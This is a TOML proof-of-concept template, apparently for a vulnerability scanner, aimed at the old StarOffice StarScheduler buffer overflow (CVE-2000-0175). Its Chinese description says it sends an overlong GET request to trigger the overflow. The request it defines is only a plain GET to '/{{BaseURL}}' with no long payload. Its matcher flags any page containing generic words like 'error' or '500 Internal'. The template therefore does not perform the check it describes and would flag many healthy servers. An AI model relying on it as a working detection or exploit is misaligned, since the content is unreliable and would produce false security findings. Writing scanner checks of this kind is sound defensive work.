[info]
author = "AVE"
description = "通过向 StarScheduler Web 服务器发送超长 GET 请求触发缓冲区溢出，检测服务器响应异常。"
id = "POC-AVE-2000-0555"
name = "StarOffice StarScheduler Buffer Overflow PoC"
severity = "critical"
tags = [
    "cve-2000-0175",
    "buffer-overflow",
    "staroffice",
]
vuln_id = [
    "CVE-2000-0175",
    "AVE-2000-0555",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "buffer overflow",
    "stack overflow",
    "segmentation fault",
    "500 Internal",
    "error",
]
